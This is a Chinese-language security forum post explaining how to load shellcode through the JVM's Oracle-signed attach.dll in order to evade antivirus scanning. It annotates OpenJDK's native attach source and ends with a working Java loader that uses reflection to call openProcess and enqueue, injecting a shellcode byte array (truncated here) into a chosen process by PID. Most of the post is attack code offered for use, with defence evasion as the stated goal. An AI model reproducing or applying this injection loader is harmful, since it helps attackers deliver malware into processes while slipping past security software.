JVM加载Shellcode
==============

0x01 前言
-------

偶尔听到使用JVM加载Shellcode，本来以为Java加载Shellcode只有一种方法，看了一些文章发现原来有JNI，JNA，JVM几种方法，以前看到的基本都是基于JNA的

JNI加载需要落地一个dll文件

JNA为了加载dll会生成jni.dll，该文件没有签名

JVM是也需要JNI，不过所需的dll由Java提供，有Oracle的签名，可以一定程度上避开杀软扫描

0x02 看看代码
---------

上面说的dll在JAVA\_HOME\\jre\\bin\\下

名称为attach.dll

调用attach.dll的方法都在WindowsVirtualMachine类中

该类的字节码在tools.jar包中sun.tools.attach下

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ef761d355e533c27fefd1c8a86ecc8ce8b61bb05.png)

这次只需要用到openProcess和enqueue方法

然后看一下在Navite层中这些方法是怎么实现的

### openProcess

看方法名知道是获取进程句柄

```c
JNIEXPORT jlong JNICALL Java_sun_tools_attach_WindowsVirtualMachine_openProcess
  (JNIEnv *env, jclass cls, jint pid)
{
    HANDLE hProcess = NULL;

    if (pid == (jint) GetCurrentProcessId()) {
        //判断输入的pid是否和当前进程的相同
        hProcess = GetCurrentProcess();
        //相同则直接得到当前进程的句柄
        if (DuplicateHandle(hProcess, hProcess, hProcess, &hProcess,
                PROCESS_ALL_ACCESS, FALSE, 0) == 0) {
            //尝试复制句柄，如果返回为0说明复制错误，句柄可能存在权限问题
            //没有什么特殊含义就是一个试错
            hProcess = NULL;
            //走到这里说明复制失败了，把句柄该为NULL
        }
    }

    if (hProcess == NULL) {
        /*
            走到这里
            1.句柄复制出现错误了
            2.输入的不是当前进程的pid
        */
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
        //尝试OpenProcess取得句柄
        if (hProcess == NULL && GetLastError() == ERROR_ACCESS_DENIED) {
            //如果得到句柄为NULL，且错误原因为权限不够，尝试提升句柄权限
            hProcess = doPrivilegedOpenProcess(PROCESS_ALL_ACCESS, FALSE,
                           (DWORD)pid);
            //该函数的实现在下面，这里简单说就是尝试提权后再次获得句柄
        }

        if (hProcess == NULL) {
            //如果句柄还是为NULL......
            if (GetLastError() == ERROR_INVALID_PARAMETER) {
                //报错为ERROR_INVALID_PARAMETER则报错找不到进程
                JNU_ThrowIOException(env, "no such process");
            } else {
                //反之输出报错进程的pid和错误码
                char err_mesg[255];
                /* include the last error in the default detail message */
                sprintf(err_mesg, "OpenProcess(pid=%d) failed; LastError=0x%x",
                    (int)pid, (int)GetLastError());
                JNU_ThrowIOExceptionWithLastError(env, err_mesg);
            }
            return (jlong)0;
        }
    }

    if (_IsWow64Process != NULL) {
        //如果存在IsWow64Process函数则进行下面的步骤
        //如果当前进程和想openProcess的进程不是相同的位数，报错
        //就是说只要知道java的位数，然后使用对应位数的shellcode去尝试注入进程就不太会出现因为shellcode导致进程崩溃的情况，如下图，对和java不同位数的进程有保护作用
        BOOL isCurrent32bit, isTarget32bit;
        (*_IsWow64Process)(GetCurrentProcess(), &isCurrent32bit);
        (*_IsWow64Process)(hProcess, &isTarget32bit);

        if (isCurrent32bit != isTarget32bit) {
            CloseHandle(hProcess);
            #ifdef _WIN64
              JNU_ThrowByName(env, "com/sun/tools/attach/AttachNotSupportedException",
                  "Unable to attach to 32-bit process running under WOW64");
            #else
              JNU_ThrowByName(env, "com/sun/tools/attach/AttachNotSupportedException",
                  "Unable to attach to 64-bit process");
            #endif
        }
    }

    return (jlong)hProcess;
}
```

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-75e5e5e716135df42f802c43dd9361f32eca3d06.png)

最后返回句柄

### doPrivilegedOpenProcess

该函数是在上面函数普通获取句柄失败后执行的函数

因为以前写过了修改令牌的文章了就不一句句扣了

简单的说就是尝试开启当前进程的debug权限，有了该权限就可以得到SYSTEM权限的进程句柄了

尝试开启后如开启成功再去调用openProcess获得句柄

如果开启失败则提示权限不够

```c
static HANDLE
doPrivilegedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    HANDLE hToken;
    HANDLE hProcess = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp, tpPrevious;
    DWORD retLength, error;

    /*
     * Get the access token
     */
    if (!OpenThreadToken(GetCurrentThread(),
                         TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
                         FALSE,
                         &hToken)) {
        if (GetLastError() != ERROR_NO_TOKEN) {
            return (HANDLE)NULL;
        }

        /*
         * No access token for the thread so impersonate the security context
         * of the process.
         */
        if (!ImpersonateSelf(SecurityImpersonation)) {
            return (HANDLE)NULL;
        }
        if (!OpenThreadToken(GetCurrentThread(),
                             TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
                             FALSE,
                             &hToken)) {
            return (HANDLE)NULL;
        }
    }

    /*
     * Get LUID for the privilege
     */
    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        error = GetLastError();
        CloseHandle(hToken);
        SetLastError(error);
        return (HANDLE)NULL;
    }

    /*
     * Enable the privilege
     */
    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;

    error = 0;
    if (AdjustTokenPrivileges(hToken,
                              FALSE,
                              &tp,
                              sizeof(TOKEN_PRIVILEGES),
                              &tpPrevious,
                              &retLength)) {
        /*
         * If we enabled the privilege then attempt to open the
         * process.
         */
        if (GetLastError() == ERROR_SUCCESS) {
            hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
            if (hProcess == NULL) {
                error = GetLastError();
            }
        } else {
            error = ERROR_ACCESS_DENIED;
        }

        /*
         * Revert to the previous privileges
         */
        AdjustTokenPrivileges(hToken,
                              FALSE,
                              &tpPrevious,
                              retLength,
                              NULL,
                              NULL);
    } else {
        error = GetLastError();
    }

    /*
     * Close token and restore error
     */
    CloseHandle(hToken);
    SetLastError(error);

    return hProcess;
}/
```

### enqueue

最重要的执行shellcode的函数

```c
typedef struct {
   GetModuleHandleFunc _GetModuleHandle;
   GetProcAddressFunc _GetProcAddress;
   char jvmLib[MAX_LIBNAME_LENGTH];         /* "jvm.dll" */
   char func1[MAX_FUNC_LENGTH];
   char func2[MAX_FUNC_LENGTH];
   char cmd[MAX_CMD_LENGTH];                /* "load", "dump", ...      */
   char arg[MAX_ARGS][MAX_ARG_LENGTH];      /* arguments to command     */
   char pipename[MAX_PIPE_NAME_LENGTH];
} DataBlock;

JNIEXPORT void JNICALL Java_sun_tools_attach_WindowsVirtualMachine_enqueue
  (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd,
   jstring pipename, jobjectArray args)
{
    DataBlock data;
    DataBlock* pData;
    DWORD* pCode;
    DWORD stubLen;
    HANDLE hProcess, hThread;
    jint argsLen, i;
    jbyte* stubCode;
    jboolean isCopy;

    data._GetModuleHandle = _GetModuleHandle;
    data._GetProcAddress = _GetProcAddress;

    strcpy(data.jvmLib, "jvm");
    strcpy(data.func1, "JVM_EnqueueOperation");
    strcpy(data.func2, "_JVM_EnqueueOperation@20");

    //给DataBlock的成员赋值，后面结构体会复制到目标进程内
    jstring_to_cstring(env, cmd, data.cmd, MAX_CMD_LENGTH);
    //将Java字符串改为C的字符串，后面Java代码中cmd的值是NULL先不用管
    argsLen = (*env)->GetArrayLength(env, args);
    //得到参数的个数，参数在Java代码中也是0，这里也可以不用看
    if (argsLen > 0) {
        if (argsLen > MAX_ARGS) {
            JNU_ThrowInternalError(env, "Too many arguments");
        }
        for (i=0; i<argsLen; i++) {
            jobject obj = (*env)->GetObjectArrayElement(env, args, i);
            if (obj == NULL) {
                data.arg[i][0] = '\0';
            } else {
                jstring_to_cstring(env, obj, data.arg[i], MAX_ARG_LENGTH);
            }
            if ((*env)->ExceptionOccurred(env)) return;
        }
    }
    for (i=argsLen; i<MAX_ARGS; i++) {
        data.arg[i][0] = '\0';
    }
    //上面就是将参数存到DataBlock，参数不能超过3

    jstring_to_cstring(env, pipename, data.pipename, MAX_PIPE_NAME_LENGTH);
    //同cmd这里管道也是NULL所以不管

    hProcess = (HANDLE)handle;

    pData = (DataBlock*) VirtualAllocEx( hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE );
    if (pData == NULL) {
        JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed");
        return;
    }
    WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&data, (SIZE_T)sizeof(DataBlock), NULL );

    //到这里就是经典的线程注入了，这段先把DataBlock结构复制到目标函数

    stubLen = (DWORD)(*env)->GetArrayLength(env, stub);
    //得到shellcode的长度
    stubCode = (*env)->GetByteArrayElements(env, stub, &isCopy);
    //好像是获取数组内容，网上没找到native代码是怎么实现的
    //应该是把shellcode内容复制env块中，然后返回指向该区域的指针
    //该函数要配合ReleaseByteArrayElements使用，类似malloc和free
    //isCopy应该是返回是否复制成功
    pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    //在目标进程内开内存
    if (pCode == NULL) {
        JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed");
        //开内存失败调用VirtualFreeEx释放目标进程中写入的DataBlock的内存
        VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE);
        return;
    }
    WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL );
    //把shellcode写入目标进程的内存
    if (isCopy) {
        (*env)->ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);
    }
    //对应上面的GetByteArrayElements，已经写入了就可以在env中释放掉了

    //执行远程线程
    hThread = CreateRemoteThread( hProcess,
                                  NULL,
                                  0,
                                  (LPTHREAD_START_ROUTINE) pCode,
                                  pData,
                                  0,
                                  NULL );
    if (hThread != NULL) {
        if (WaitForSingleObject(hThread, INFINITE) != WAIT_OBJECT_0) {
            JNU_ThrowIOExceptionWithLastError(env, "WaitForSingleObject failed");
        } else {
            DWORD exitCode;
            GetExitCodeThread(hThread, &exitCode);
            if (exitCode) {
                switch (exitCode) {
                    case ERR_OPEN_JVM_FAIL :
                        JNU_ThrowIOException(env,
                            "jvm.dll not loaded by target process");
                        break;
                    case ERR_GET_ENQUEUE_FUNC_FAIL :
                        JNU_ThrowIOException(env,
                            "Unable to enqueue operation: the target VM does not support attach mechanism");
                        break;
                    default :
                        JNU_ThrowInternalError(env,
                            "Remote thread failed for unknown reason");
                }
            }
        }
        CloseHandle(hThread);
    } else {
        if (GetLastError() == ERROR_NOT_ENOUGH_MEMORY) {

            JNU_ThrowIOException(env,
                "Insufficient memory or insufficient privileges to attach");
        } else {
            JNU_ThrowIOExceptionWithLastError(env, "CreateRemoteThread failed");
        }
    }
    //上面这块使用寻找报错原因的，如果返回线程的句柄不为空则调用GetExitCodeThread得到线程的状态
    //如果为GetExitCodeThread返回STILL_ACTIVE代表线程正在运行
    //如果返回别的则根据定义在代码中返回异常
    VirtualFreeEx(hProcess, pCode, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE);
    //释放存DataBlock和shellcode的内存
}

```

0x03代码实现
--------

```java
import java.lang.reflect.Method;

public class shellcodeLoader {

    public static void main(String[] args) throws Exception {
        byte[] shellcode = new byte[] {(byte) 0xfc,(byte) 0x48......(byte) 0x00,(byte) 0x12,(byte) 0x34,(byte) 0x56,(byte) 0x78};
        //存放shellcode数组
        Class CST_AV = Class.forName("sun.tools.attach.WindowsVirtualMachine");
        //通过反射的方式取得类
        Method openProcess = CST_AV.getDeclaredMethod("openProcess", int.class);
        //这里需要用getDeclaredMethod方法
        //getDeclaredMethod可以取得类自身的所有方法，只用getMethod是拿不到native方法的
        openProcess.setAccessible(true);
        //关闭安全检查，这样可以调用native实现的方法
        long hProcess = (long)openProcess.invoke(null, 20248);
        //指定要注入进程的pid
        Method enqueue = CST_AV.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
        //同样的找到enqueue方法
        enqueue.setAccessible(true);
        //同上
        Object[] params = new Object[]{};
        //这里不需要参数所以定义一个空的数组
        enqueue.invoke(null, hProcess, shellcode , null,null, params);
        //执行shellcode
    }
}
```

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8b461532edc050d7fed649b7044b597509854943.png)

可以在注入在别的进程中防止java崩溃

如果要注入在Java可以执行下面的代码得到Java的位数

```java
Properties sysProperty=System.getProperties();        System.out.println(sysProperty.getProperty("sun.arch.data.model"));
```

参考文章
----

<http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/53ea4b5cef9b/src/windows/native/sun/tools/attach/WindowsVirtualMachine.c> native源码

[https://mp.weixin.qq.com/s?\_\_biz=MzUzNTEyMTE0Mw==&amp;mid=2247484630&amp;idx=1&amp;sn=5d911558674ba5a210988df35addb3eb&amp;chksm=fa8b194ecdfc9058194a730f280fbf0eb31deaddf1bbdbb135493d593e876b807e6cc14ecae8&amp;mpshare=1&amp;scene=23&amp;srcid=0416ZxN1HVvqomAlYcyCWOVb&amp;sharer\_sharetime=1618562024905&amp;sharer\_shareid=1bc23e263140fcf4ac8b70cca428273d#rd](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484630&idx=1&sn=5d911558674ba5a210988df35addb3eb&chksm=fa8b194ecdfc9058194a730f280fbf0eb31deaddf1bbdbb135493d593e876b807e6cc14ecae8&mpshare=1&scene=23&srcid=0416ZxN1HVvqomAlYcyCWOVb&sharer_sharetime=1618562024905&sharer_shareid=1bc23e263140fcf4ac8b70cca428273d#rd)